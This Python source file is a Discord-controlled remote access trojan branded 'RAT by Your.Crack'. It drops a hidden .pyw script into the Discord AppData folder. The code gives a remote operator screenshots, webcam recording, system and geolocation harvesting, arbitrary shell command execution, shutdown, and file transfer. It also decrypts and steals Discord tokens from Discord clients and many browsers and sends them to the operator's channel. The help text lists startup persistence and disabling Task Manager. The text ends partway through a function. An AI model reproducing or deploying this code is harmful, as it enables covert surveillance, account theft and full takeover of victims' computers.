import os
import sys
from pathlib import Path
import subprocess
import discord
from win32crypt import CryptUnprotectData
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import windll, byref, create_string_buffer
from comtypes import CLSCTX_ALL
import time

file_name = "r4tbyHeartWay.pyw"

appdata_roaming_path = Path(os.path.expanduser('~')) / 'AppData' / 'Roaming'

discord_path = appdata_roaming_path / 'discord'

if not discord_path.exists():
    discord_path.mkdir(parents=True, exist_ok=True)

file_path = discord_path / file_name

script_content = r'''
import subprocess
import sys

package_mapping = {
    "opencv-python": "cv2",
    "pillow": "PIL",
    "pycryptodome": "Crypto",
    "pycryptodomex": "Cryptodome",
    "win32crypt": "win32crypt",
    "pycaw": "pycaw",
    "gputil": "GPUtil",
}

packages = [
    "discord", "discord.ext.commands", "platform", "socket", "psutil", "uuid", 
    "shutil", "requests", "screeninfo", "getpass", "tempfile", "os", "pyautogui", 
    "io", "webbrowser", "pyttsx3", "re", "base64", "json", "winreg", "pyaudio", 
    "opencv-python", "time", "inspect", "ctypes", "wave", "tkinter", "asyncio", "threading", 
    "pathlib", "pillow", "win32crypt", "pycaw", "comtypes", "pycryptodome", "pycryptodomex",
    "gputil"
]

def install_package(package_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
    except subprocess.CalledProcessError:
        print(f"Erreur lors de l'installation de {package_name}, passage au suivant...")

for package in packages:
    import_name = package_mapping.get(package, package.split('.')[0])
    
    try:
        __import__(import_name)
    except ImportError:
        print(f"{package} n'est pas installé. Installation en cours...")
        install_package(package)

import discord
from discord.ext import commands
from discord.ui import Button, View, Select
import platform
import socket
import psutil
import uuid
import shutil
import requests
import screeninfo
import getpass
import tempfile
import os
import pyautogui
import io
import webbrowser
import pyttsx3
import re
import base64
import json
import winreg
import pyaudio
import cv2
import time
import inspect
import ctypes
import GPUtil
import wave
import tkinter as tk
import asyncio
import threading
from pathlib import Path
from PIL import Image
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL

def is_pythonw():
    return sys.executable.lower().endswith('pythonw.exe')

if not is_pythonw():
    print("Ce script doit être exécuté avec pythonw.exe pour fonctionner correctement.")

if sys.platform == "win32":
    import winreg as reg

pyautogui.FAILSAFE = False

mouse_blocked = False
webcam_task = None
webcam_channel = None
captured_messages = []

# Définir la couleur verte et l'icône pour tous les embeds
EMBED_COLOR = discord.Color.from_rgb(29, 185, 1)  # #1db901 - Vert foncé
TOOL_ICON = "https://raw.githubusercontent.com/YourCrack/YourTool/main/Img/Your.Crack-Icone.ico"
# Si l'URL ci-dessus ne fonctionne pas, utiliser une URL de conversion d'ico vers png
# par exemple via un service comme https://cloudconvert.com/ico-to-png
# ou héberger l'image sur un site comme Discord CDN, Imgur, etc.

CAPTURE_PATH = "webcam_capture.jpg"

TOKEN = ''

CHANNEL_ID = 

intents = discord.Intents.default()
intents.message_content = True  
bot = commands.Bot(command_prefix='+', intents=intents, help_command=None)

connected_users = []

local_user_name = getpass.getuser()

engine = pyttsx3.init()

@bot.event
async def on_ready():
    local_user_name = getpass.getuser()
    print(f"{local_user_name} est connecté.")
    
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="🔒 Connexion Réussie | RAT by Your.Crack",
            description=f"**{local_user_name}** est maintenant sous contrôle !",
            color=EMBED_COLOR
        )
        embed.set_thumbnail(url=TOOL_ICON)
        
        embed.add_field(name="👤 Utilisateur", value=f"`{local_user_name}`", inline=True)
        embed.add_field(name="💻 Système", value=f"`{platform.system()} {platform.release()}`", inline=True)
        embed.add_field(name="⏰ Heure de connexion", value=f"`{time.strftime('%H:%M:%S')}`", inline=True)
        
        # Ajouter des instructions pour utiliser l'aide
        embed.add_field(
            name="📋 Commandes Disponibles", 
            value="Pour voir toutes les commandes disponibles, tapez:\n```+help```", 
            inline=False
        )
        
        # Ajouter des exemples rapides de commandes utiles
        quick_commands = [
            f"`+{local_user_name}_screenshot` - Prendre une capture d'écran",
            f"`+{local_user_name}_system_info` - Informations système",
            f"`+{local_user_name}_webcam 5` - Capturer 5 secondes de webcam"
        ]
        embed.add_field(name="⚡ Commandes Rapides", value="\n".join(quick_commands), inline=False)
        
        embed.set_footer(text="Développé par Your.Crack | Connecté et prêt à recevoir des commandes")

        await channel.send(embed=embed)
    else:
        print(f"Erreur : Impossible de trouver le canal avec l'ID {CHANNEL_ID}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Commande non trouvée")
    else:
        await ctx.send(f"Erreur de commande")

#screenshot

@bot.command(name=f'{local_user_name}_screenshot')
async def screenshot(ctx):
    try:
        embed = discord.Embed(
            title="Capture d'écran",
            description="Prise du screenshot en cours...",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

        screenshot = pyautogui.screenshot()

        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)

        file = discord.File(fp=buffer, filename="screenshot.png")

        embed = discord.Embed(
            title="Capture d'écran terminée",
            description="Voici la capture d'écran :",
            color=EMBED_COLOR
        )
        embed.set_image(url="attachment://screenshot.png")
        await ctx.send(embed=embed, file=file)
        
    except Exception as e:
        embed = discord.Embed(
            title="Erreur",
            description=f"Une erreur est survenue : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

#open_url

@bot.command(name=f'{local_user_name}_open_url')
async def open_url(ctx, url: str):
    try:
        if not url.startswith(('http://', 'https://')):
            await ctx.send("L'URL doit commencer par 'http://' ou 'https://'.")
            return
        
        webbrowser.open(url)

        embed = discord.Embed(
            title="Ouverture de l'URL",
            description="L'URL demandée a été ouverte dans le navigateur.",
            color=EMBED_COLOR
        )
        embed.add_field(name="URL", value=url, inline=False)

        await ctx.send(embed=embed)
        
    except Exception as e:
        error_embed = discord.Embed(
            title="Erreur lors de l'ouverture de l'URL",
            description=f"Une erreur est survenue : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=error_embed)

@bot.command(name=f'{local_user_name}_system_info')
async def system_info(ctx):
    try:
        user_name = getpass.getuser()
        computer_name = platform.node()
        display_name = os.getlogin()

        system_name = platform.system()
        system_version = platform.version()
        cpu_info = platform.processor()
        ram_info = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} Go"
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])

        gpus = GPUtil.getGPUs()
        if gpus:
            gpu_info = "\n".join([f"GPU: {gpu.name}, Mémoire Libre: {gpu.memoryFree}MB, Mémoire Totale: {gpu.memoryTotal}MB" for gpu in gpus])
        else:
            gpu_info = "Aucun GPU détecté."

        public_ip = requests.get('https://api64.ipify.org?format=json').json()["ip"]
        local_ip = socket.gethostbyname(socket.gethostname())
        
        ipv6_addresses = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET6:
                    ipv6_addresses.append(addr.address)

        ipv6 = ipv6_addresses if ipv6_addresses else ["Aucune adresse IPv6"]

        ip_info = requests.get(f'https://ipinfo.io/{public_ip}/json').json()
        isp = ip_info.get('org', 'Inconnu')
        as_info = ip_info.get('asn', {}).get('name', 'Inconnu')
        location = ip_info.get('city', 'Inconnu'), ip_info.get('region', 'Inconnu'), ip_info.get('country', 'Inconnu')
        
        disk_info = ""
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                # Vérifier si le lecteur est prêt avant d'essayer d'y accéder
                if os.path.exists(partition.mountpoint):
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    disk_info += f"{partition.device} | {round(partition_usage.free / (1024 ** 3), 2)} Go libres sur {round(partition_usage.total / (1024 ** 3), 2)} Go, {round(partition_usage.percent, 2)}% utilisé\n"
                else:
                    disk_info += f"{partition.device} | Lecteur non disponible\n"
            except Exception as disk_error:
                # Gérer les erreurs spécifiques aux disques
                disk_info += f"{partition.device} | Erreur d'accès: {str(disk_error)}\n"

        screens = screeninfo.get_monitors()
        screen_info = "\n".join([f"Écran : {screen.name}, Résolution : {screen.width}x{screen.height}, Principal : {'Oui' if screen.is_primary else 'Non'}" for screen in screens])

        location_info = requests.get(f'https://ipinfo.io/{public_ip}/json').json()
        country = location_info.get("country", "Inconnu")
        region = location_info.get("region", "Inconnu")
        city = location_info.get("city", "Inconnu")
        zip_code = location_info.get("postal", "Inconnu")
        timezone = location_info.get("timezone", "Inconnu")
        loc = location_info.get("loc", "0,0").split(',')

        embed = discord.Embed(title=f"Informations système pour {user_name}", color=EMBED_COLOR)

        embed.add_field(name=":bust_in_silhouette: | Utilisateur", value=f"Nom: {computer_name}\nUtilisateur: {user_name}\nDisplay Name: {display_name}", inline=False)
        
        embed.add_field(name=":computer: | Système", value=f"Plateforme: {system_name}\nVersion: {system_version}\nHWID: {uuid.uuid1()}\nMAC: {mac_address}\nCPU: {cpu_info}\nRAM: {ram_info}", inline=False)

        embed.add_field(name=":desktop: | GPU", value=gpu_info, inline=False)
        
        embed.add_field(name=":satellite: | Réseau", value=f"Public: {public_ip}\nLocale: {local_ip}\nIPv6: {', '.join(ipv6)}\nISP: {isp}\nOrganisation: {as_info}", inline=False)

        embed.add_field(name=":minidisc: | Disques", value=disk_info, inline=False)
        
        embed.add_field(name=":desktop: | Écrans", value=screen_info, inline=False)

        embed.add_field(name=":map: | Localisation", value=f"Pays: {country}\nRégion: {region}\nVille: {city}\nCode Postal: {zip_code}\nFuseau horaire: {timezone}\nLatitude: {loc[0]}\nLongitude: {loc[1]}", inline=False)

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de la récupération des informations système : {str(e)}")

#open_calculator

@bot.command(name=f'{local_user_name}_open_calculator')
async def open_calculator(ctx, number: int):
    try:
        if number <= 0:
            await ctx.send("Le nombre doit être un entier positif supérieur à zéro.")
            return
        
        for _ in range(number):
            subprocess.Popen('calc')

        embed = discord.Embed(
            title="Ouverture de la calculatrice",
            description=f"La calculatrice a été ouverte {number} fois.",
            color=EMBED_COLOR
        )

        await ctx.send(embed=embed)
        
    except Exception as e:
        error_embed = discord.Embed(
            title="Erreur lors de l'ouverture de la calculatrice",
            description=f"Une erreur est survenue : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=error_embed)

#voice

@bot.command(name=f'{local_user_name}_voice')
async def voice(ctx, *, text: str):
    try:
        engine.setProperty('rate', 150)
        engine.setProperty('volume', 1)
        
        engine.say(text)
        engine.runAndWait()

        embed = discord.Embed(
            title="Texte parlé",
            description=f"Le texte suivant a été lu :\n{text}",
            color=EMBED_COLOR
        )

        await ctx.send(embed=embed)
        
    except Exception as e:
        error_embed = discord.Embed(
            title="Erreur lors de la lecture du texte",
            description=f"Une erreur est survenue : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=error_embed)

#steal_tokens

def get_discord_tokens():
    tokens = set()
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    paths = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
        'Vesktop': roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
    }

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()

    def get_master_key(path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return CryptUnprotectData(master_key[5:], None, None, None, 0)[1]

    def is_valid_token(token):
        url = "https://discord.com/api/v9/users/@me"
        url = "https://discord.com/api/v10/users/@me"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "X-Discord-Locale": "en-US",
            "Accept-Language": "en-US,en;q=0.5",
        }
    
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return True
            elif response.status_code == 401:
                print(f"Token invalide ou expiré: {token}")
            else:
                print(f"Erreur API Discord {response.status_code}: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la vérification du token: {e}")
    
        return False

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            full_path = os.path.join(path, file_name)
            if not file_name.endswith(('.log', '.ldb')):
                continue
            try:
                with open(full_path, 'r', errors='ignore') as file:
                    for line in file.readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line.strip()):
                            if is_valid_token(token):
                                tokens.add(token)
                        for enc_token in re.findall(r"dQw4w9WgXcQ:[^\"]*", line.strip()):
                            try:
                                token = decrypt_val(base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), get_master_key(os.path.join(roaming, platform, "Local State")))
                                if is_valid_token(token):
                                    tokens.add(token)
                            except Exception:
                                continue
            except FileNotFoundError:
                continue
            except Exception as e:
                print(f"Erreur lors du traitement du fichier {file_name} dans {platform}: {e}")

    return list(tokens)

@bot.command(name=f'{local_user_name}_steal_tokens')
async def steal_tokens(ctx):
    await ctx.send(f"Recherche des Tokens Discord en cours..")
    tokens = get_discord_tokens()
    
    embed = discord.Embed(
        title="Tokens Discord",
        color=EMBED_COLOR
    )
    
    if tokens:
        tokens_text = "\n".join([f"**_Token :_** `{token}`" for token in tokens])
        embed.add_field(
            name="Tokens trouvés",
            value=tokens_text,
            inline=False
        )
    else:
        embed.add_field(
            name="Résultat",
            value="**_Aucun token valide trouvé._**",
            inline=False
        )

    await ctx.send(embed=embed)

#help

commands_by_category = {
    "Général": [
        {"cmd": "+help", "desc": "Affiche cette aide avec toutes les commandes disponibles", "emoji": "📋"},
        {"cmd": "+clear", "desc": "Nettoie le salon pour une meilleure lisibilité", "emoji": "🧹"}
    ],
    "Système": [
        {"cmd": "+<username>_screenshot", "desc": "Prend une capture d'écran de l'ordinateur cible", "emoji": "📸"},
        {"cmd": "+<username>_system_info", "desc": "Affiche les informations système détaillées (OS, CPU, RAM, etc.)", "emoji": "💻"},
        {"cmd": "+<username>_shutdown", "desc": "Éteint l'ordinateur cible", "emoji": "⏻"},
        {"cmd": "+<username>_restart", "desc": "Redémarre l'ordinateur cible", "emoji": "🔄"},
        {"cmd": "+<username>_cmd <commande>", "desc": "Exécute une commande CMD/Terminal sur l'ordinateur cible", "emoji": "⌨️"},
        {"cmd": "+<username>_logout", "desc": "Déconnecte l'utilisateur de l'ordinateur", "emoji": "🚪"}
    ],
    "Réseau & Fichiers": [
        {"cmd": "+<username>_open_url <url>", "desc": "Ouvre l'URL spécifiée dans le navigateur", "emoji": "🌐"},
        {"cmd": "+<username>_list_folder", "desc": "Liste tous les dossiers présents sur l'ordinateur cible", "emoji": "📁"},
        {"cmd": "+<username>_list_file <chemin>", "desc": "Liste tous les fichiers dans un dossier spécifique", "emoji": "📄"},
        {"cmd": "+<username>_upload <chemin>", "desc": "Récupère un fichier depuis l'ordinateur cible", "emoji": "⬆️"},
        {"cmd": "+<username>_install", "desc": "Télécharge un fichier sur l'ordinateur cible", "emoji": "⬇️"}
    ],
    "Multimédia": [
        {"cmd": "+<username>_voice <texte>", "desc": "Convertit le texte en parole et le prononce", "emoji": "🔊"},
        {"cmd": "+<username>_play_s", "desc": "Joue un fichier audio sur l'ordinateur cible", "emoji": "🎵"},
        {"cmd": "+<username>_play_v", "desc": "Joue un fichier vidéo sur l'ordinateur cible", "emoji": "🎬"},
        {"cmd": "+<username>_webcam <temps>", "desc": "Prend une capture vidéo de la webcam", "emoji": "📹"},
        {"cmd": "+<username>_webcam_on", "desc": "Active la webcam en continu", "emoji": "📹"},
        {"cmd": "+<username>_webcam_off", "desc": "Désactive la webcam", "emoji": "📹"},
        {"cmd": "+<username>_record <temps>", "desc": "Enregistre le microphone pendant le temps spécifié", "emoji": "🎙️"},
        {"cmd": "+<username>_wallpaper", "desc": "Change le fond d'écran (joindre une image)", "emoji": "🖼️"}
    ],
    "Contrôle Utilisateur": [
        {"cmd": "+<username>_block_mouse", "desc": "Bloque la souris de l'utilisateur", "emoji": "🖱️"},
        {"cmd": "+<username>_unblock_mouse", "desc": "Débloque la souris de l'utilisateur", "emoji": "🖱️"},
        {"cmd": "+<username>_volumemax", "desc": "Met le volume au maximum", "emoji": "🔊"},
        {"cmd": "+<username>_volumemin", "desc": "Met le volume au minimum", "emoji": "🔈"},
        {"cmd": "+<username>_message <type> <message>", "desc": "Affiche un message sur l'écran (types: info, warning, error)", "emoji": "💬"},
        {"cmd": "+<username>_spam", "desc": "Ouvre un programme plusieurs fois", "emoji": "♻️"},
        {"cmd": "+<username>_open_calculator <nombre>", "desc": "Ouvre la calculatrice le nombre de fois spécifié", "emoji": "🧮"}
    ],
    "Sécurité": [
        {"cmd": "+<username>_steal_tokens", "desc": "Récupère les tokens Discord présents sur le PC", "emoji": "🔑"},
        {"cmd": "+<username>_geolocate", "desc": "Géolocalise l'ordinateur cible", "emoji": "🌍"},
        {"cmd": "+<username>_startup", "desc": "Installe le RAT au démarrage de Windows", "emoji": "🔄"},
        {"cmd": "+<username>_block_taskmanager", "desc": "Désactive le gestionnaire des tâches", "emoji": "🔒"},
        {"cmd": "+<username>_unblock_taskmanager", "desc": "Réactive le gestionnaire des tâches", "emoji": "🔓"}
    ]
}

def create_help_embed(page_num):
    categories = list(commands_by_category.keys())
    start = page_num * 2
    end = min(start + 2, len(categories))
    
    embed = discord.Embed(
        title="📚 Commandes RAT by Your.Crack",
        description=f"**Remplacez `<username>` par `{local_user_name}` dans toutes les commandes**\n\n",
        color=EMBED_COLOR
    )
    
    embed.set_thumbnail(url=TOOL_ICON)
    
    # Bannière du haut
    if page_num == 0:
        embed.add_field(
            name="💡 Comment utiliser ces commandes",
            value=(
                "• Les commandes avec `<username>` doivent utiliser le nom d'utilisateur réel\n"
                "• Exemple: `+joshua_screenshot` pour prendre une capture d'écran\n"
                "• Utilisez les boutons ci-dessous pour naviguer entre les pages\n"
            ),
            inline=False
        )
    
    # Ajouter les catégories pour cette page
    for category in categories[start:end]:
        formatted_commands = []
        for cmd_info in commands_by_category[category]:
            emoji = cmd_info["emoji"]
            cmd = cmd_info["cmd"].replace("<username>", local_user_name)
            desc = cmd_info["desc"]
            formatted_commands.append(f"{emoji} **`{cmd}`**\n└─ {desc}")
        
        embed.add_field(
            name=f"▶️ {category}",
            value="\n\n".join(formatted_commands),
            inline=False
        )
    
    # Pied de page
    total_pages = (len(categories) + 1) // 2
    embed.set_footer(text=f"Page {page_num + 1}/{total_pages} • Utilisez les boutons pour naviguer • YourCrack RAT")
    
    return embed

@bot.command(name='help')
async def help_command(ctx):
    try:
        view = View()
        
        # Boutons plus stylisés
        prev_button = Button(label="◀️ Précédent", style=discord.ButtonStyle.secondary)
        next_button = Button(label="Suivant ▶️", style=discord.ButtonStyle.primary)
        
        page_num = 0
        
        async def next_callback(interaction):
            nonlocal page_num
            categories = list(commands_by_category.keys())
            max_pages = (len(categories) + 1) // 2
            
            if page_num < max_pages - 1:
                page_num += 1
                await interaction.response.edit_message(embed=create_help_embed(page_num), view=view)
                
        async def prev_callback(interaction):
            nonlocal page_num
            if page_num > 0:
                page_num -= 1
                await interaction.response.edit_message(embed=create_help_embed(page_num), view=view)
                
        next_button.callback = next_callback
        prev_button.callback = prev_callback
        
        view.add_item(prev_button)
        view.add_item(next_button)
        
        # Message d'introduction
        intro = discord.Embed(
            title="🔮 Your.Crack RAT - Centre de Commandes",
            description=(
                f"Bienvenue dans le panneau de contrôle du RAT.\n\n"
                f"Ce panneau vous permet de contrôler l'ordinateur de **{local_user_name}**.\n"
                f"Toutes les commandes commencent par `+{local_user_name}_` suivi du nom de la commande.\n\n"
                f"Voici la liste complète des commandes disponibles:"
            ),
            color=EMBED_COLOR
        )
        intro.set_thumbnail(url=TOOL_ICON)
        await ctx.send(embed=intro)
        
        # Menu principal des commandes
        await ctx.send(embed=create_help_embed(page_num), view=view)
        
    except Exception as e:
        print(f"Erreur lors de l'envoi du message d'aide : {str(e)}")
        await ctx.send(f"Une erreur s'est produite : {str(e)}")

#shutdown

@bot.command(name=f'{local_user_name}_shutdown')
async def shutdown(ctx):
    try:
        embed = discord.Embed(
            title="Arrêt du PC",
            description="Le PC va s'éteindre dans un instant.",
            color=EMBED_COLOR
        )
        
        await ctx.send(embed=embed)

        subprocess.run("shutdown /s /t 1", shell=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="Erreur lors de l'arrêt",
            description=f"Une erreur est survenue lors de l'arrêt du PC : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=error_embed)

#restart

@bot.command(name=f'{local_user_name}_restart')
async def restart(ctx):
    try:
        embed = discord.Embed(
            title="Redémarrage du PC",
            description="Le PC va redémarrer dans un instant.",
            color=discord.Color.orange()
        )
        
        await ctx.send(embed=embed)

        subprocess.run("shutdown /r /t 1", shell=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="Erreur lors du redémarrage",
            description=f"Une erreur est survenue lors du redémarrage du PC : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=error_embed)

#message

@bot.command(name=f'{local_user_name}_message')
async def display_message(ctx, msg_type: str, *, message: str):
    try:
        title = ""
        embed_color = EMBED_COLOR
        msg_box_type = 0x40

        if msg_type.lower() == 'error':
            title = "Erreur"
            msg_box_type = 0x10
            embed_color = discord.Color.blue()

        elif msg_type.lower() == 'warning':
            title = "Avertissement"
            msg_box_type = 0x30
            embed_color = discord.Color.blue()

        elif msg_type.lower() == 'info':
            title = "Information"
            msg_box_type = 0x40
            embed_color = discord.Color.blue()

        else:
            title = "Message"
            msg_box_type = 0x40
            embed_color = discord.Color.greyple()

        ctypes.windll.user32.MessageBoxW(0, message, title, msg_box_type)

        embed = discord.Embed(
            title=f"Message {title.lower()} affiché",
            description=f"**Type**: {msg_type.capitalize()}\n**Message**: {message}",
            color=embed_color
        )
        embed.set_footer(text="Affiché sur l'écran principal")

        await ctx.send(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="Erreur",
            description=f"Une erreur est survenue lors de l'affichage du message : {str(e)}",
            color=EMBED_COLOR,
        )
        await ctx.send(embed=error_embed)

#color_screen

@bot.command(name=f'{local_user_name}_color_screen')
async def color_screen(ctx, color: str):
    try:
        color = color.lower()
        hex_color = color if color.startswith('#') else f"#{color}"
        
        root = pyautogui.getWindow('root')  
        root.fill(hex_color)

        root.geometry("+0+0")
        root.attributes("-fullscreen", True)
        root.mainloop()

        await ctx.send(f"L'écran a été rempli avec la couleur : {color}")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'application de la couleur : {str(e)}")

#cmd

@bot.command(name=f'{local_user_name}_cmd')
async def execute_cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else "Commande exécutée avec succès, mais aucune sortie."
        error = result.stderr if result.stderr else None
        
        if error:
            await ctx.send(f":x: Erreur : {error}")
        else:
            for i in range(0, len(output), 2000):
                await ctx.send(f"```{output[i:i+2000]}```")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'exécution de la commande : {str(e)}")

#list_app

@bot.command(name=f'{local_user_name}_list_app')
async def list_applications(ctx):
    try:
        apps = []
        registry_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for registry_path in registry_paths:
            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, registry_path)
            for i in range(0, reg.QueryInfoKey(key)[0]):
                subkey_name = reg.EnumKey(key, i)
                subkey = reg.OpenKey(key, subkey_name)
                try:
                    app_name = reg.QueryValueEx(subkey, "DisplayName")[0]
                    apps.append(app_name)
                except FileNotFoundError:
                    continue

        if apps:
            with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix=".txt") as temp_file:
                apps_list = "\n".join(sorted(apps))
                temp_file.write(apps_list)
                temp_file_path = temp_file.name

            with open(temp_file_path, 'rb') as file:
                await ctx.send("Voici la liste des applications installées :", file=discord.File(file, "applications.txt"))

            os.remove(temp_file_path)
        else:
            await ctx.send("Aucune application trouvée.")

    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de la récupération des applications : {str(e)}")

#webcam

@bot.command(name=f'{local_user_name}_webcam')
async def capture_webcam(ctx, duration: int):
    try:
        if duration <= 0:
            embed = discord.Embed(
                title="Erreur",
                description="La durée doit être un nombre positif.",
                color=EMBED_COLOR
            )
            await ctx.send(embed=embed)
            return

        embed = discord.Embed(
            title="Capture de la webcam",
            description="La capture de la webcam est en cours...",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            embed = discord.Embed(
                title="Erreur",
                description="Impossible d'accéder à la webcam.",
                color=EMBED_COLOR
            )
            await ctx.send(embed=embed)
            return

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp4') as temp_file:
            temp_file_path = temp_file.name
            out = cv2.VideoWriter(temp_file_path, fourcc, 20.0, (int(cap.get(3)), int(cap.get(4))))

            frame_count = 0
            max_frames = duration * 30

            while frame_count < max_frames:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
                frame_count += 1

            cap.release()
            out.release()

        if os.path.getsize(temp_file_path) > 0:
            with open(temp_file_path, 'rb') as file:
                embed = discord.Embed(
                    title="Capture de la webcam terminée",
                    description="Voici la vidéo capturée :",
                    color=EMBED_COLOR
                )
                await ctx.send(embed=embed, file=discord.File(file, "capture.mp4"))
        else:
            embed = discord.Embed(
                title="Erreur",
                description="Erreur lors de la capture vidéo : fichier vidéo vide.",
                color=EMBED_COLOR
            )
            await ctx.send(embed=embed)

        os.remove(temp_file_path)

    except Exception as e:
        embed = discord.Embed(
            title="Erreur",
            description=f"Une erreur est survenue lors de la capture vidéo : {str(e)}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

#clear

@bot.command(name='clear')
@commands.has_permissions(manage_messages=True)
async def clear_channel(ctx):
    try:
        await ctx.channel.purge()

        local_user_name = getpass.getuser()

        embed = discord.Embed(
            title="Utilisateurs connectés",
            description=f"Voici la liste des clients :",
            color=EMBED_COLOR
        )
        embed.set_thumbnail(url=TOOL_ICON)

        embed.add_field(name="Utilisateur", value=local_user_name, inline=False)

        await ctx.send(embed=embed)

    except Exception as e:
        print(f"Erreur lors de la suppression des messages : {str(e)}")

#install

@bot.command(name=f'{local_user_name}_install')
async def install(ctx):
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(os.getcwd(), attachment.filename)
        
        await attachment.save(file_path)
        await ctx.send(f'Fichier {attachment.filename} téléchargé avec succès.')
    else:
        await ctx.send('Aucun fichier attaché. Veuillez joindre un fichier à votre message.')

#block_mouse

@bot.command(name=f'{local_user_name}_block_mouse')
async def block_mouse(ctx):
    global mouse_blocked
    if not mouse_blocked:
        mouse_blocked = True
        embed = discord.Embed(
            title="Souris bloquée",
            description="La souris est maintenant bloquée.",
            color=EMBED_COLOR
